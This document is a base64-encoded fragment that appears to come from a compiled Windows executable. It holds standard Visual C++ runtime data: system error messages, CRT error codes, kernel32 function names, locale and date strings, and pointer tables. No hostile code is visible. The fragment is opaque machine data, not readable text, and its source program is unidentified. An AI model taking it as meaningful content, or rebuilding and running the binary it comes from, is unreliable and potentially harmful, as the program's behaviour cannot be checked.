cmVxdWlyZWQAAAAAZXhlY3V0YWJsZSBmb3JtYXQgZXJyb3IAZmlsZSB0b28gbGFyZ2UAAGhvc3QgdW5yZWFjaGFibGUAAAAAAAAAAGlkZW50aWZpZXIgcmVtb3ZlZAAAAAAAAGlsbGVnYWwgYnl0ZSBzZXF1ZW5jZQAAAGluYXBwcm9wcmlhdGUgaW8gY29udHJvbCBvcGVyYXRpb24AAAAAAABpbnZhbGlkIHNlZWsAAAAAaXMgYSBkaXJlY3RvcnkAAG1lc3NhZ2Ugc2l6ZQAAAABuZXR3b3JrIGRvd24AAAAAbmV0d29yayByZXNldAAAAG5ldHdvcmsgdW5yZWFjaGFibGUAAAAAAG5vIGJ1ZmZlciBzcGFjZQBubyBjaGlsZCBwcm9jZXNzAAAAAAAAAABubyBsaW5rAG5vIG1lc3NhZ2UgYXZhaWxhYmxlAAAAAG5vIG1lc3NhZ2UAAAAAAABubyBwcm90b2NvbCBvcHRpb24AAAAAAABubyBzdHJlYW0gcmVzb3VyY2VzAAAAAABubyBzdWNoIGRldmljZSBvciBhZGRyZXNzAAAAAAAAAG5vIHN1Y2ggcHJvY2VzcwBub3QgYSBkaXJlY3RvcnkAbm90IGEgc29ja2V0AAAAAG5vdCBhIHN0cmVhbQAAAABub3QgY29ubmVjdGVkAAAAbm90IHN1cHBvcnRlZAAAAG9wZXJhdGlvbiBpbiBwcm9ncmVzcwAAAG9wZXJhdGlvbiBub3QgcGVybWl0dGVkAG9wZXJhdGlvbiBub3Qgc3VwcG9ydGVkAG9wZXJhdGlvbiB3b3VsZCBibG9jawAAAG93bmVyIGRlYWQAAAAAAABwcm90b2NvbCBlcnJvcgAAcHJvdG9jb2wgbm90IHN1cHBvcnRlZAAAcmVhZCBvbmx5IGZpbGUgc3lzdGVtAAAAcmVzb3VyY2UgZGVhZGxvY2sgd291bGQgb2NjdXIAAAByZXN1bHQgb3V0IG9mIHJhbmdlAAAAAABzdGF0ZSBub3QgcmVjb3ZlcmFibGUAAABzdHJlYW0gdGltZW91dAAAdGV4dCBmaWxlIGJ1c3kAAHRpbWVkIG91dAAAAAAAAAB0b28gbWFueSBmaWxlcyBvcGVuIGluIHN5c3RlbQAAAHRvbyBtYW55IGxpbmtzAAB0b28gbWFueSBzeW1ib2xpYyBsaW5rIGxldmVscwAAAHZhbHVlIHRvbyBsYXJnZQB3cm9uZyBwcm90b2NvbCB0eXBlAAAAAAAIrgFAAQAAADAQAEABAAAA8D0AQAEAAADwPQBAAQAAAGAQAEABAAAAsBAAQAEAAABwEABAAQAAAJCtAUABAAAAMBAAQAEAAADQEABAAQAAAOAQAEABAAAAYBAAQAEAAACwEABAAQAAAHAQAEABAAAAMK4BQAEAAAAwEABAAQAAAFARAEABAAAAYBEAQAEAAABgEABAAQAAALAQAEABAAAAcBAAQAEAAACorgFAAQAAADAQAEABAAAAsBEAQAEAAADAEQBAAQAAADASAEABAAAAsBAAQAEAAABwEABAAQAAAOipAUABAAAAUDQAQAEAAACsTgBAAQAAAGJhZCBhbGxvY2F0aW9uAABoqgFAAQAAAIw0AEABAAAArE4AQAEAAADoqgFAAQAAAIw0AEABAAAArE4AQAEAAABwqwFAAQAAAIw0AEABAAAArE4AQAEAAABfaHlwb3QAAPirAUABAAAARD4AQAEAAABtAHMAYwBvAHIAZQBlAC4AZABsAGwAAABDb3JFeGl0UHJvY2VzcwAAY3Nt4AEAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAgBZMZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACkAAIABAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAAAAAAIAWTGQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkEwAQAEAAABwrAFAAQAAAOxNAEABAAAArE4AQAEAAABVbmtub3duIGV4Y2VwdGlvbgAAAAAAAABg6gFAAQAAAADrAUABAAAAKG51bGwpAAAoAG4AdQBsAGwAKQAAAAAAAAAAAAAAAAAGAAAGAAEAABAAAwYABgIQBEVFRQUFBQUFNTAAUAAAAAAoIDhQWAcIADcwMFdQBwAAICAIAAAAAAhgaGBgYGAAAHhweHh4eAgHCAAABwAICAgAAAgACAAHCAAAAAAAAABrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAAAAAAAAAAAEZsc0FsbG9jAAAAAAAAAABGbHNGcmVlAEZsc0dldFZhbHVlAAAAAABGbHNTZXRWYWx1ZQAAAAAASW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkV4AAAAAABDcmVhdGVFdmVudEV4VwAAQ3JlYXRlU2VtYXBob3JlRXhXAAAAAAAAU2V0VGhyZWFkU3RhY2tHdWFyYW50ZWUAQ3JlYXRlVGhyZWFkcG9vbFRpbWVyAAAAU2V0VGhyZWFkcG9vbFRpbWVyAAAAAAAAV2FpdEZvclRocmVhZHBvb2xUaW1lckNhbGxiYWNrcwBDbG9zZVRocmVhZHBvb2xUaW1lcgAAAABDcmVhdGVUaHJlYWRwb29sV2FpdAAAAABTZXRUaHJlYWRwb29sV2FpdAAAAAAAAABDbG9zZVRocmVhZHBvb2xXYWl0AAAAAABGbHVzaFByb2Nlc3NXcml0ZUJ1ZmZlcnMAAAAAAAAAAEZyZWVMaWJyYXJ5V2hlbkNhbGxiYWNrUmV0dXJucwAAR2V0Q3VycmVudFByb2Nlc3Nvck51bWJlcgAAAAAAAABHZXRMb2dpY2FsUHJvY2Vzc29ySW5mb3JtYXRpb24AAENyZWF0ZVN5bWJvbGljTGlua1cAAAAAAFNldERlZmF1bHREbGxEaXJlY3RvcmllcwAAAAAAAAAARW51bVN5c3RlbUxvY2FsZXNFeAAAAAAAQ29tcGFyZVN0cmluZ0V4AEdldERhdGVGb3JtYXRFeABHZXRMb2NhbGVJbmZvRXgAR2V0VGltZUZvcm1hdEV4AEdldFVzZXJEZWZhdWx0TG9jYWxlTmFtZQAAAAAAAAAASXNWYWxpZExvY2FsZU5hbWUAAAAAAAAATENNYXBTdHJpbmdFeAAAAEdldEN1cnJlbnRQYWNrYWdlSWQAAAAAAEdldFRpY2tDb3VudDY0AABHZXRGaWxlSW5mb3JtYXRpb25CeUhhbmRsZUV4VwAAAFNldEZpbGVJbmZvcm1hdGlvbkJ5SGFuZGxlVwAAAAAAAAAAAAAAAAACAAAAAAAAABBOAUABAAAACAAAAAAAAABwTgFAAQAAAAkAAAAAAAAA0E4BQAEAAAAKAAAAAAAAADBPAUABAAAAEAAAAAAAAACATwFAAQAAABEAAAAAAAAA4E8BQAEAAAASAAAAAAAAAEBQAUABAAAAEwAAAAAAAACQUAFAAQAAABgAAAAAAAAA8FABQAEAAAAZAAAAAAAAAGBRAUABAAAAGgAAAAAAAACwUQFAAQAAABsAAAAAAAAAIFIBQAEAAAAcAAAAAAAAAJBSAUABAAAAHgAAAAAAAADgUgFAAQAAAB8AAAAAAAAAIFMBQAEAAAAgAAAAAAAAAPBTAUABAAAAIQAAAAAAAABgVAFAAQAAACIAAAAAAAAAUFYBQAEAAAB4AAAAAAAAALhWAUABAAAAeQAAAAAAAADYVgFAAQAAAHoAAAAAAAAA+FYBQAEAAAD8AAAAAAAAABRXAUABAAAA/wAAAAAAAAAgVwFAAQAAAFIANgAwADAAMgANAAoALQAgAGYAbABvAGEAdABpAG4AZwAgAHAAbwBpAG4AdAAgAHMAdQBwAHAAbwByAHQAIABuAG8AdAAgAGwAbwBhAGQAZQBkAA0ACgAAAAAAAAAAAFIANgAwADAAOAANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGEAcgBnAHUAbQBlAG4AdABzAA0ACgAAAAAAAAAAAAAAAAAAAFIANgAwADAAOQANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGUAbgB2AGkAcgBvAG4AbQBlAG4AdAANAAoAAAAAAAAAAAAAAFIANgAwADEAMAANAAoALQAgAGEAYgBvAHIAdAAoACkAIABoAGEAcwAgAGIAZQBlAG4AIABjAGEAbABsAGUAZAANAAoAAAAAAAAAAAAAAAAAUgA2ADAAMQA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAdABoAHIAZQBhAGQAIABkAGEAdABhAA0ACgAAAAAAAAAAAAAAUgA2ADAAMQA3AA0ACgAtACAAdQBuAGUAeABwAGUAYwB0AGUAZAAgAG0AdQBsAHQAaQB0AGgAcgBlAGEAZAAgAGwAbwBjAGsAIABlAHIAcgBvAHIADQAKAAAAAAAAAAAAUgA2ADAAMQA4AA0ACgAtACAAdQBuAGUAeABwAGUAYwB0AGUAZAAgAGgAZQBhAHAAIABlAHIAcgBvAHIADQAKAAAAAAAAAAAAAAAAAAAAAABSADYAMAAxADkADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAG8AcABlAG4AIABjAG8AbgBzAG8AbABlACAAZABlAHYAaQBjAGUADQAKAAAAAAAAAAAAAAAAAAAAAABSADYAMAAyADQADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABfAG8AbgBlAHgAaQB0AC8AYQB0AGUAeABpAHQAIAB0AGEAYgBsAGUADQAKAAAAAAAAAAAAUgA2ADAAMgA1AA0ACgAtACAAcAB1AHIAZQAgAHYAaQByAHQAdQBhAGwAIABmAHUAbgBjAHQAaQBvAG4AIABjAGEAbABsAA0ACgAAAAAAAABSADYAMAAyADYADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABzAHQAZABpAG8AIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAUgA2ADAAMgA3AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAHcAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIAOAANAAoALQAgAHUAbgBhAGIAbABlACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAGgAZQBhAHAADQAKAAAAAAAAAAAAUgA2ADAAMwAwAA0ACgAtACAAQwBSAFQAIABuAG8AdAAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAZAANAAoAAAAAAFIANgAwADMAMQANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIABpAG4AaQB0AGkAYQBsAGkAegBlACAAdABoAGUAIABDAFIAVAAgAG0AbwByAGUAIAB0AGgAYQBuACAAbwBuAGMAZQAuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuAA0ACgAAAAAAAAAAAAAAAABSADYAMAAzADIADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABsAG8AYwBhAGwAZQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgANAAoAAAAAAAAAAAAAAAAAUgA2ADAAMwAzAA0ACgAtACAAQQB0AHQAZQBtAHAAdAAgAHQAbwAgAHUAcwBlACAATQBTAEkATAAgAGMAbwBkAGUAIABmAHIAbwBtACAAdABoAGkAcwAgAGEAcwBzAGUAbQBiAGwAeQAgAGQAdQByAGkAbgBnACAAbgBhAHQAaQB2AGUAIABjAG8AZABlACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuACAASQB0ACAAaQBzACAAbQBvAHMAdAAgAGwAaQBrAGUAbAB5ACAAdABoAGUAIAByAGUAcwB1AGwAdAAgAG8AZgAgAGMAYQBsAGwAaQBuAGcAIABhAG4AIABNAFMASQBMAC0AYwBvAG0AcABpAGwAZQBkACAAKAAvAGMAbAByACkAIABmAHUAbgBjAHQAaQBvAG4AIABmAHIAbwBtACAAYQAgAG4AYQB0AGkAdgBlACAAYwBvAG4AcwB0AHIAdQBjAHQAbwByACAAbwByACAAZgByAG8AbQAgAEQAbABsAE0AYQBpAG4ALgANAAoAAAAAAFIANgAwADMANAANAAoALQAgAGkAbgBjAG8AbgBzAGkAcwB0AGUAbgB0ACAAbwBuAGUAeABpAHQAIABiAGUAZwBpAG4ALQBlAG4AZAAgAHYAYQByAGkAYQBiAGwAZQBzAA0ACgAAAAAARABPAE0AQQBJAE4AIABlAHIAcgBvAHIADQAKAAAAAABTAEkATgBHACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFQATABPAFMAUwAgAGUAcgByAG8AcgANAAoAAAANAAoAAAAAAAAAAAByAHUAbgB0AGkAbQBlACAAZQByAHIAbwByACAAAAAAAFIAdQBuAHQAaQBtAGUAIABFAHIAcgBvAHIAIQAKAAoAUAByAG8AZwByAGEAbQA6ACAAAAAAAAAAPABwAHIAbwBnAHIAYQBtACAAbgBhAG0AZQAgAHUAbgBrAG4A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AQAAAEoEAAAAAAAA8H8BQAEAAABLBAAAAAAAAACAAUABAAAATAQAAAAAAAAQgAFAAQAAAE4EAAAAAAAAIIABQAEAAABPBAAAAAAAADCAAUABAAAAUAQAAAAAAABAgAFAAQAAAFIEAAAAAAAAUIABQAEAAABWBAAAAAAAAGCAAUABAAAAVwQAAAAAAABwgAFAAQAAAFoEAAAAAAAAgIABQAEAAABlBAAAAAAAAJCAAUABAAAAawQAAAAAAACggAFAAQAAAGwEAAAAAAAAsIABQAEAAACBBAAAAAAAAMCAAUABAAAAAQgAAAAAAADQgAFAAQAAAAQIAAAAAAAAQFgBQAEAAAAHCAAAAAAAAOCAAUABAAAACQgAAAAAAADwgAFAAQAAAAoIAAAAAAAAAIEBQAEAAAAMCAAAAAAAABCBAUABAAAAEAgAAAAAAAAggQFAAQAAABMIAAAAAAAAMIEBQAEAAAAUCAAAAAAAAECBAUABAAAAFggAAAAAAABQgQFAAQAAABoIAAAAAAAAYIEBQAEAAAAdCAAAAAAAAHiBAUABAAAALAgAAAAAAACIgQFAAQAAADsIAAAAAAAAoIEBQAEAAAA+CAAAAAAAALCBAUABAAAAQwgAAAAAAADAgQFAAQAAAGsIAAAAAAAA2IEBQAEAAAABDAAAAAAAAOiBAUABAAAABAwAAAAAAAD4gQFAAQAAAAcMAAAAAAAACIIBQAEAAAAJDAAAAAAAABiCAUABAAAACgwAAAAAAAAoggFAAQAAAAwMAAAAAAAAOIIBQAEAAAAaDAAAAAAAAEiCAUABAAAAOwwAAAAAAABgggFAAQAAAGsMAAAAAAAAcIIBQAEAAAABEAAAAAAAAICCAUABAAAABBAAAAAAAACQggFAAQAAAAcQAAAAAAAAoIIBQAEAAAAJEAAAAAAAALCCAUABAAAAChAAAAAAAADAggFAAQAAAAwQAAAAAAAA0IIBQAEAAAAaEAAAAAAAAOCCAUABAAAAOxAAAAAAAADwggFAAQAAAAEUAAAAAAAAAIMBQAEAAAAEFAAAAAAAABCDAUABAAAABxQAAAAAAAAggwFAAQAAAAkUAAAAAAAAMIMBQAEAAAAKFAAAAAAAAECDAUABAAAADBQAAAAAAABQgwFAAQAAABoUAAAAAAAAYIMBQAEAAAA7FAAAAAAAAHiDAUABAAAA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